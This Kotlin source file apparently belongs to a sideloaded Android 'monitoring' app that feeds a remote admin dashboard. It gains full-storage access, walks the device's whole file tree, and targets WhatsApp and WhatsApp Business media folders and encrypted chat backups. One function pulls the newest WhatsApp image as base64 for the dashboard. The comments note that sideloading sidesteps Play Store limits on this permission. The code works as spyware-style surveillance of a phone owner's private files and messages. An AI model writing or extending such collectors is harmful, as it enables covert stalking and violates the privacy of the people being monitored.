package com.spapp.monitoring.collectors

import android.content.Context
import android.os.Environment
import com.spapp.monitoring.network.FileEntryDto
import java.io.File

/**
 * Lists files the admin can view via the dashboard's File Manager screen.
 *
 * Browses the device's full shared storage (Environment.getExternalStorageDirectory())
 * when MANAGE_EXTERNAL_STORAGE has been granted — see MainActivity's "Grant Full
 * File Access" button. This app is sideloaded (not distributed through Play
 * Store), so the Play Store policy that normally restricts this permission
 * to file-manager/antivirus-category apps does not block it here; the admin
 * explicitly asked for the full on-device file listing, not just this app's
 * own sandbox.
 *
 * Falls back to the app's own private internal storage (context.filesDir)
 * if full access hasn't been granted yet, so File Manager still returns
 * something rather than failing outright.
 */
class FileManagerCollector(private val context: Context) {

    fun hasFullAccess(): Boolean = Environment.isExternalStorageManager()

    private fun root(): File =
        if (hasFullAccess()) Environment.getExternalStorageDirectory() else context.filesDir

    fun listFiles(relativePath: String? = null): List<FileEntryDto> = try {
        // context.filesDir / getExternalStorageDirectory() can return a path
        // through a symlink while File.canonicalFile resolves to the real
        // path — canonicalize ONCE up front and reuse that same reference for
        // both the traversal check and relativeTo(), or the two diverge and
        // every "relative" path comes out as a garbled "../../../.." chain.
        // The whole function is wrapped — .canonicalFile can throw IOException
        // on some real-device storage states, and an uncaught exception here
        // previously crashed the entire SyncWorker run, leaving the command
        // stuck at "sent" forever (never acked, never failed).
        val root = root().canonicalFile
        val target = if (relativePath.isNullOrBlank()) root else File(root, relativePath)
        val safeTarget = target.canonicalFile

        if (!safeTarget.path.startsWith(root.path)) {
            emptyList() // path traversal guard
        } else if (!safeTarget.exists() || !safeTarget.isDirectory) {
            emptyList()
        } else {
            safeTarget.listFiles()?.mapNotNull { file ->
                // A handful of system dirs throw/return null on listFiles() due
                // to per-directory permission quirks on some OEM ROMs — skip
                // just that entry instead of failing the whole listing.
                try {
                    FileEntryDto(
                        name = file.name,
                        path = file.canonicalFile.relativeTo(root).path,
                        isDirectory = file.isDirectory,
                        sizeBytes = if (file.isFile) file.length() else null,
                        mimeType = if (file.isFile) guessMimeType(file.extension) else null
                    )
                } catch (e: Exception) {
                    null
                }
            }?.sortedWith(compareBy({ !it.isDirectory }, { it.name })) ?: emptyList()
        }
    } catch (e: Exception) {
        emptyList()
    }

    /**
     * Walks the entire storage tree in one pass (breadth-first, so a huge
     * single branch can't starve the rest) instead of requiring the admin to
     * click into one folder at a time — the dashboard no longer does
     * per-folder navigation commands. Capped at [maxEntries] so a phone with
     * tens of thousands of media files doesn't produce an unbounded payload;
     * once the cap is hit, remaining directories are simply not descended
     * into (the admin still sees what was found so far).
     */
    fun listAllRecursive(maxEntries: Int = 3000): List<FileEntryDto> {
        val root = try {
            root().canonicalFile
        } catch (e: Exception) {
            return emptyList()
        }
        if (!root.exists() || !root.isDirectory) return emptyList()

        val results = mutableListOf<FileEntryDto>()
        val queue = ArrayDeque<File>()
        queue.add(root)

        while (queue.isNotEmpty() && results.size < maxEntries) {
            val dir = queue.removeFirst()
            val children = try {
                dir.listFiles()
            } catch (e: Exception) {
                null
            } ?: continue

            for (file in children) {
                if (results.size >= maxEntries) break
                try {
                    val canonical = file.canonicalFile
                    if (!canonical.path.startsWith(root.path)) continue // path traversal / symlink-escape guard

                    results += FileEntryDto(
                        name = file.name,
                        path = canonical.relativeTo(root).path,
                        isDirectory = file.isDirectory,
                        sizeBytes = if (file.isFile) file.length() else null,
                        mimeType = if (file.isFile) guessMimeType(file.extension) else null
                    )
                    if (file.isDirectory) queue.add(file)
                } catch (e: Exception) {
                    // Skip just this entry (OEM-specific permission quirk on one
                    // file/dir) rather than failing the whole walk.
                }
            }
        }

        return results.sortedWith(compareBy({ it.path.count { c -> c == '/' } }, { !it.isDirectory }, { it.path }))
    }

    fun listWhatsAppFiles(maxEntries: Int = 1500): List<FileEntryDto> {
        val root = try {
            root().canonicalFile
        } catch (e: Exception) {
            return emptyList()
        }
        if (!root.exists() || !root.isDirectory) return emptyList()

        val candidates = listOf(
            File(root, "Android/media/com.whatsapp/WhatsApp/Media"),
            File(root, "Android/media/com.whatsapp/WhatsApp"),
            File(root, "Android/media/com.whatsapp"),
            File(root, "WhatsApp/Media"),
            File(root, "WhatsApp"),
            File(root, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media"),
            File(root, "Android/media/com.whatsapp.w4b/WhatsApp Business"),
            File(root, "Android/media/com.whatsapp.w4b")
        )
        val waRoot = candidates.firstOrNull { it.exists() && it.isDirectory } ?: return emptyList()

        val results = mutableListOf<FileEntryDto>()
        val queue = ArrayDeque<File>()
        queue.add(waRoot)

        while (queue.isNotEmpty() && results.size < maxEntries) {
            val dir = queue.removeFirst()
            val children = try {
                dir.listFiles()
            } catch (e: Exception) {
                null
            } ?: continue

            for (file in children) {
                if (results.size >= maxEntries) break
                try {
                    val canonical = file.canonicalFile
                    if (!canonical.path.startsWith(root.path)) continue

                    results += FileEntryDto(
                        name = file.name,
                        path = canonical.relativeTo(root).path,
                        isDirectory = file.isDirectory,
                        sizeBytes = if (file.isFile) file.length() else null,
                        mimeType = if (file.isFile) guessMimeType(file.extension) else null
                    )
                    if (file.isDirectory) queue.add(file)
                } catch (_: Exception) {
                }
            }
        }
        return results.sortedWith(compareBy({ it.path.count { c -> c == '/' } }, { !it.isDirectory }, { it.name }))
    }

    fun resolveFile(relativePath: String): File? = try {
        val root = root().canonicalFile
        val target = File(root, relativePath)
        val safeTarget = target.canonicalFile
        if (!safeTarget.path.startsWith(root.path)) null
        else if (safeTarget.isFile) safeTarget else null
    } catch (e: Exception) {
        null
    }

    private fun guessMimeType(extension: String): String? = when (extension.lowercase()) {
        "jpg", "jpeg" -> "image/jpeg"
        "png" -> "image/png"
        "webp" -> "image/webp"
        "gif" -> "image/gif"
        "heic" -> "image/heic"
        "heif" -> "image/heif"
        "pdf" -> "application/pdf"
        "txt" -> "text/plain"
        "json" -> "application/json"
        "mp4" -> "video/mp4"
        "mkv" -> "video/x-matroska"
        "mov" -> "video/quicktime"
        "3gp" -> "video/3gpp"
        "mp3" -> "audio/mpeg"
        "opus" -> "audio/opus"
        "ogg" -> "audio/ogg"
        "m4a" -> "audio/m4a"
        "doc", "docx" -> "application/msword"
        "apk" -> "application/vnd.android.package-archive"
        "crypt14", "crypt15", "crypt12", "db" -> "application/octet-stream"
        else -> null
    }

    fun getLatestWhatsAppImageBase64(maxAgeMs: Long = 2 * 24 * 60 * 60 * 1000L): String? = try {
        val root = root().canonicalFile
        val candidateDirs = listOf(
            File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images"),
            File(root, "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/Sent"),
            File(root, "WhatsApp/Media/WhatsApp Images"),
            File(root, "WhatsApp/Media/WhatsApp Images/Sent"),
            File(root, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images"),
            File(root, "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Images/Sent")
        )
        val validDirs = candidateDirs.filter { it.exists() && it.isDirectory }
        val allImages = validDirs.flatMap { dir ->
            dir.listFiles { f -> f.isFile && (f.name.endsWith(".jpg", true) || f.name.endsWith(".jpeg", true) || f.name.endsWith(".png", true)) }?.toList() ?: emptyList()
        }
        val latest = allImages.maxByOrNull { it.lastModified() }
        if (latest != null && (System.currentTimeMillis() - latest.lastModified()) <= maxAgeMs) {
            val bm = android.graphics.BitmapFactory.decodeFile(latest.absolutePath)
            if (bm != null) {
                val scaled = if (bm.width > 600 || bm.height > 600) {
                    val scale = 600f / maxOf(bm.width, bm.height)
                    android.graphics.Bitmap.createScaledBitmap(bm, (bm.width * scale).toInt(), (bm.height * scale).toInt(), true)
                } else bm
                val stream = java.io.ByteArrayOutputStream()
                scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 75, stream)
                "data:image/jpeg;base64," + android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
            } else null
        } else null
    } catch (_: Exception) {
        null
    }
}
